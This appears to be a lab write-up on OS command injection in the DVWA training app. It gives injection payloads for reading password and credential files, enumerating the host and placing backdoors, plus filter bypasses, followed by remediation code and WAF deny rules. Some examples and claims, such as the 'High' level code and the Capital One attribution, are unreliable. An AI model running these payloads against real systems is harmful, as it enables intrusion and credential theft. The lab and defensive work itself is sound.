# Command Injection Vulnerability Analysis

## 📋 Overview
Command Injection (also known as Shell Injection) occurs when an application passes unsanitized user input directly to system shell commands, allowing attackers to execute arbitrary OS commands on the server.

**Vulnerability Type:** CWE-78  
**OWASP Category:** A03:2021 - Injection  
**Severity:** CRITICAL (CVSS 9.8)

## 🔍 Discovery Process

### Initial Testing

**Normal Input:** `127.0.0.1`  
**Response:** Standard ping output (expected behavior)

**Test Input:** `127.0.0.1; whoami`  
**Response:** Ping output + command execution result  
**Conclusion:** Application vulnerable to command injection

**Alternative Tests:**
- `127.0.0.1 && whoami` - AND operator
- `127.0.0.1 | whoami` - Pipe operator
- `127.0.0.1 || whoami` - OR operator
- `127.0.0.1$(whoami)` - Command substitution

## 🎯 Exploitation Methodology

### 1. Basic Command Execution

**Payload:** `127.0.0.1; whoami`  
**Result:** ✅ Executed `whoami` command  
**Expected Output:** `www-data` (web server user)

**Underlying Command:**
```bash
ping -c 4 127.0.0.1; whoami
2. Directory Listing
Payload: 127.0.0.1; ls -la
Result: ✅ Listed web server directory contents
Impact: Reveals application structure and sensitive files
Expected Output:
total 48
drwxr-xr-x 8 www-data www-data 4096 Dec 14 10:30 .
drwxr-xr-x 5 www-data www-data 4096 Dec 14 10:25 ..
-rw-r--r-- 1 www-data www-data  245 Dec 14 10:28 index.php
-rw-r--r-- 1 www-data www-data 1234 Dec 14 10:27 config.php
3. Reading Sensitive Files
Payload: 127.0.0.1; cat /etc/passwd
Result: ✅ Read system password file
Impact: Extracted all system user accounts
Sample Output:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:999:999::/home/mysql:/bin/sh
4. System Information Gathering
Payloads and Results:
Payload
Result
Information Gained
127.0.0.1; pwd
/var/www/html/vulnerabilities/exec
Current directory
127.0.0.1 && uname -a
Linux dvwa 5.10.0 x86_64 GNU/Linux
OS and kernel
127.0.0.1; id
uid=33(www-data) gid=33(www-data)
User privileges
127.0.0.1; whoami
www-data
Current user
5. Database Credential Exposure
Payload: 127.0.0.1; cat /var/www/html/config/config.inc.php
Result: ✅ Extracted database credentials
Impact: Complete database access possible
Typical Exposed Data:
$_DVWA['db_server'] = 'localhost';
$_DVWA['db_database'] = 'dvwa';
$_DVWA['db_user'] = 'dvwa';
$_DVWA['db_password'] = 'p@ssw0rd';
6. Network Reconnaissance
Payload: 127.0.0.1; netstat -tupln 2>/dev/null
Result: Active network connections and listening ports
Impact: Identify additional attack vectors (SSH, databases, etc.)
7. Environment Variables
Payload: 127.0.0.1; env
Result: All environment variables exposed
Potential Leaks: API keys, passwords, file paths, internal URLs
8. File System Operations
Write File:
127.0.0.1; echo "backdoor" > /tmp/test.txt
Read Back:
127.0.0.1; cat /tmp/test.txt
Result: ✅ Successfully wrote and read file
Impact: Potential for persistent backdoor installation
9. Finding Writable Directories
Payload: 127.0.0.1; find /var/www -writable -type d 2>/dev/null
Result: Directories where www-data can write
Use Case: Identify locations for backdoor placement
10. Command Chaining Techniques
Operator
Syntax
Behavior
Example
;
cmd1; cmd2
Execute both commands sequentially
ping 127.0.0.1; whoami
&&
cmd1 && cmd2
Execute cmd2 only if cmd1 succeeds
127.0.0.1 && whoami
||
cmd1 || cmd2
Execute cmd2 only if cmd1 fails
invalid || whoami
|
cmd1 | cmd2
Pipe cmd1 output to cmd2
cat /etc/passwd | grep root
`cmd`
`whoami`
Command substitution
echo \whoami``
$(cmd)
$(whoami)
Command substitution (preferred)
echo $(whoami)
&
cmd &
Run command in background
ping 127.0.0.1 &
📸 Evidence
cmd-injection-01-whoami.png - Basic command execution
cmd-injection-02-ls.png - Directory listing
cmd-injection-03-passwd.png - Sensitive file read
cmd-injection-04-config.png - Database credentials exposure
cmd-injection-05-netstat.png - Network reconnaissance
🛡️ Impact Assessment
Severity: CRITICAL (CVSS Score: 9.8)
Immediate Impacts
Arbitrary Command Execution - Complete control as web server user
Data Exfiltration - Read any file accessible to www-data user
System Information Disclosure - Full system enumeration
Credential Theft - Access to database passwords, API keys, tokens
File System Manipulation - Write backdoors, modify files
Lateral Movement - Pivot point to attack internal network
Denial of Service - Crash services or consume resources
Privilege Escalation Path - Identify SUID binaries, kernel exploits
Attack Chain Progression
1. Command Injection Discovery
   ↓
2. Information Gathering (users, files, network, permissions)
   ↓
3. Credential Harvesting (config files, environment variables)
   ↓
4. Privilege Escalation (kernel exploits, SUID, sudo misconfigurations)
   ↓
5. Persistence (backdoors, web shells, cron jobs, SSH keys)
   ↓
6. Data Exfiltration (databases, source code, user data)
   ↓
7. Lateral Movement (pivot to internal systems)
   ↓
8. Complete Infrastructure Compromise
Real-World Examples
2014 Shellshock (CVE-2014-6271): Bash command injection affecting millions of systems
2017 Equifax Breach: Command injection in Apache Struts led to 147M records stolen
2019 Capital One Breach: SSRF + command injection exposed 100M customer records
2021 Microsoft Exchange: ProxyShell vulnerabilities included command injection
🔒 Remediation Strategies
1. Input Validation - Whitelist Approach (PRIMARY DEFENSE)
Vulnerable Code:
<?php
$target = $_GET['ip'];
// DANGEROUS - passes user input directly to shell
$cmd = "ping -c 4 " . $target;
system($cmd);
?>
Secure Code:
<?php
$target = $_GET['ip'];

// Step 1: Validate IP address format
if (!filter_var($target, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    http_response_code(400);
    die("Error: Invalid IP address format");
}

// Step 2: Additional regex validation (only digits and dots)
if (!preg_match('/^[0-9\.]+$/', $target)) {
    http_response_code(400);
    die("Error: Invalid characters in input");
}

// Step 3: Range validation (optional)
$octets = explode('.', $target);
foreach ($octets as $octet) {
    if ($octet < 0 || $octet > 255) {
        die("Error: Invalid IP range");
    }
}

// Step 4: Escape as additional layer (defense in depth)
$target = escapeshellarg($target);

// Step 5: Execute with validated input
$cmd = "ping -c 4 " . $target;
$output = shell_exec($cmd);
echo "<pre>" . htmlspecialchars($output, ENT_QUOTES, 'UTF-8') . "</pre>";
?>
2. Use Built-in PHP Escaping Functions
escapeshellarg() - Escape a string to be used as shell argument:
<?php
$target = $_GET['ip'];

// Validates first
if (!filter_var($target, FILTER_VALIDATE_IP)) {
    die("Invalid IP address");
}

// Wraps string in single quotes and escapes any existing single quotes
$safe_target = escapeshellarg($target);

// Now safe to use
$output = shell_exec("ping -c 4 " . $safe_target);
echo "<pre>" . htmlspecialchars($output) . "</pre>";
?>
escapeshellcmd() - Escape shell metacharacters:
<?php
// Escapes: #&;`|*?~<>^()[]{}$\, \x0A, \xFF
$safe_command = escapeshellcmd($user_input);
?>
⚠️ WARNING: escapeshellcmd() alone is NOT sufficient! Always combine with validation.
3. Avoid Shell Functions Entirely (BEST PRACTICE)
Use proc_open() with explicit argument arrays:
<?php
$target = $_GET['ip'];

// Validate IP
if (!filter_var($target, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    die("Invalid IP address");
}

// Use proc_open with array of arguments (NO SHELL INVOKED)
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin
   1 => array("pipe", "w"),  // stdout
   2 => array("pipe", "w")   // stderr
);

$process = proc_open(
    array('ping', '-c', '4', $target),  // Array = no shell, no injection possible
    $descriptorspec,
    $pipes,
    NULL,
    NULL
);

if (is_resource($process)) {
    $output = stream_get_contents($pipes[1]);
    $errors = stream_get_contents($pipes[2]);
    
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    
    $return_value = proc_close($process);
    
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}
?>
Why This is Better:
No shell is invoked (/bin/sh is bypassed)
Arguments are passed directly to the program
Command injection is impossible
Each argument is treated as literal data
4. Use Higher-Level Libraries
Instead of system commands, use native PHP functions:
<?php
// BAD: Using shell to check if file exists
$exists = shell_exec("test -f /path/to/file && echo 1");

// GOOD: Use PHP built-in
$exists = file_exists('/path/to/file');

// BAD: Using shell to read directory
$files = shell_exec("ls -la /path/");

// GOOD: Use PHP built-in
$files = scandir('/path/');

// BAD: Using shell to download file
shell_exec("curl https://example.com/file -o /tmp/file");

// GOOD: Use PHP built-in
file_put_contents('/tmp/file', file_get_contents('https://example.com/file'));
?>
5. Principle of Least Privilege
System Level:
# Run web server as dedicated user with minimal permissions
sudo useradd -r -s /usr/sbin/nologin -M webserver

# Set ownership
sudo chown -R webserver:webserver /var/www/html

# Restrict permissions
sudo chmod -R 750 /var/www/html

# Remove shell access
sudo usermod -s /usr/sbin/nologin www-data

# Restrict sudo access (never give www-data sudo!)
# Verify with: sudo -l -U www-data
Application Level - PHP Configuration:
; In php.ini - Disable dangerous functions
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,symlink,link,apache_child_terminate,posix_kill,posix_mkfifo,posix_setpgid,posix_setsid,posix_setuid,escapeshellcmd,dl

; Restrict file operations
open_basedir = /var/www/html:/tmp

; Disable URL file access
allow_url_fopen = Off
allow_url_include = Off
6. Web Application Firewall Rules
ModSecurity Configuration:
# Detect command injection attempts
SecRule ARGS|ARGS_NAMES "@rx (?i)(;|\||`|\$\(|&&|\|\||>|<|\n|\r)" \
    "id:1000,\
    phase:2,\
    deny,\
    status:403,\
    log,\
    msg:'Command Injection Attempt - Shell Metacharacters',\
    logdata:'Matched Data: %{MATCHED_VAR} in %{MATCHED_VAR_NAME}',\
    severity:CRITICAL,\
    tag:'OWASP_CRS',\
    tag:'COMMAND_INJECTION'"

# Block common Unix commands in input
SecRule ARGS|ARGS_NAMES "@rx (?i)(whoami|id|uname|cat|ls|pwd|wget|curl|chmod|chown)" \
    "id:1001,\
    phase:2,\
    deny,\
    status:403,\
    msg:'Command Injection - Unix Command Detected',\
    severity:WARNING"
7. Content Security Policy (Defense in Depth)
HTTP Headers:
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'; script-src 'self'
X-XSS-Protection: 1; mode=block
8. Input Sanitization (Additional Layer)
Remove dangerous characters:
<?php
function sanitize_command_input($input) {
    // Remove shell metacharacters
    $dangerous_chars = array(
        ';', '&', '|', '`', '$', '(', ')', '{', '}',
        '[', ']', '<', '>', '\n', '\r', '\t',
        '\'', '"', '\\', '*', '?', '~', '^'
    );
    
    $sanitized = str_replace($dangerous_chars, '', $input);
    
    // Also remove command names (blacklist approach - not sufficient alone!)
    $dangerous_commands = array(
        'cat', 'ls', 'whoami', 'id', 'uname', 'wget', 'curl',
        'chmod', 'chown', 'rm', 'mv', 'cp', 'exec', 'eval'
    );
    
    $sanitized = str_ireplace($dangerous_commands, '', $sanitized);
    
    return $sanitized;
}

$target = sanitize_command_input($_GET['ip']);

// STILL VALIDATE AFTER SANITIZATION!
if (!filter_var($target, FILTER_VALIDATE_IP)) {
    die("Invalid IP address");
}
?>
⚠️ IMPORTANT: Sanitization/blacklisting is NOT a primary defense! Always use whitelisting and validation.
9. Logging and Monitoring
Log all command executions:
<?php
function log_command_execution($command, $user_ip, $result) {
    $log_entry = sprintf(
        "[%s] IP: %s | Command: %s | Result: %s\n",
        date('Y-m-d H:i:s'),
        $user_ip,
        $command,
        $result ? 'SUCCESS' : 'FAILED'
    );
    
    error_log($log_entry, 3, '/var/log/command_exec.log');
    
    // Alert on suspicious patterns
    if (preg_match('/;|\||`|\$\(/', $command)) {
        error_log("ALERT: Possible command injection attempt from " . $user_ip, 0);
        // Send email/SMS alert to security team
    }
}
?>
🧪 Testing on Higher Security Levels
Medium Security
DVWA Code Changes:
<?php
$target = $_GET['ip'];
$target = str_replace(array('&&', ';'), '', $target);
system("ping -c 4 " . $target);
?>
Weakness: Only removes && and ;
Bypass Techniques:
Pipe operator:
127.0.0.1 | whoami
OR operator:
127.0.0.1 || whoami
Command substitution:
127.0.0.1 `whoami`
127.0.0.1 $(whoami)
Newline character:
127.0.0.1
whoami
High Security
DVWA Code:
<?php
$target = trim($_GET['ip']);
$target = stripslashes($target);

if (stristr(php_uname('s'), 'Windows NT')) {
    $cmd = shell_exec('ping ' . $target);
} else {
    $cmd = shell_exec('ping -c 4 ' . $target);
}

echo "<pre>{$cmd}</pre>";
?>
Weakness: stripslashes() only removes backslashes, doesn't prevent injection!
Bypass: All previous techniques still work
Impossible Security
DVWA Code:
<?php
$target = $_REQUEST['ip'];
$target = stripslashes($target);

$octet = explode(".", $target);

if ((is_numeric($octet[0])) && (is_numeric($octet[1])) && (is_numeric($octet[2])) && (is_numeric($octet[3])) && (sizeof($octet) == 4)) {
    $target = $octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];
    
    if (stristr(php_uname('s'), 'Windows NT')) {
        $cmd = shell_exec('ping ' . $target);
    } else {
        $cmd = shell_exec('ping -c 4 ' . $target);
    }
    
    echo "<pre>{$cmd}</pre>";
} else {
    echo '<pre>ERROR: You have entered an invalid IP.</pre>';
}
?>
Security: ✅ Properly validates each octet is numeric
Result: Command injection NOT possible (when validation is strict)
🎯 Key Takeaways
✅ Never pass user input to shell functions - Use native language functions
✅ Whitelist validation only - Never trust blacklists
✅ Use proc_open() with arrays - Avoid shell invocation entirely
✅ Validate format rigorously - IP addresses, filenames, etc.
✅ Principle of least privilege - Minimal permissions for web server
✅ Disable dangerous PHP functions - In production environments
✅ Log and monitor - Detect and alert on injection attempts
✅ Defense in depth - Multiple layers of protection
✅ Never use: system(), exec(), shell_exec(), passthru(), `backticks`
📚 Learning Resources
OWASP Command Injection
PortSwigger OS Command Injection
CWE-78: OS Command Injection
PHP Security Guide
OWASP Testing Guide - Command Injection
🔄 Next Steps
Test bypasses on Medium/High security
Create Python automation script
Research blind command injection techniques
Study out-of-band data exfiltration
Move to File Upload vulnerabilities
Tested By: Daniel Oyanogbezina
Date: December 14, 2025
DVWA Security Level: Low
Status: ✅ Successfully Exploited | 🛡️ Remediation Documented
Environment: Ubuntu + Docker + DVWA
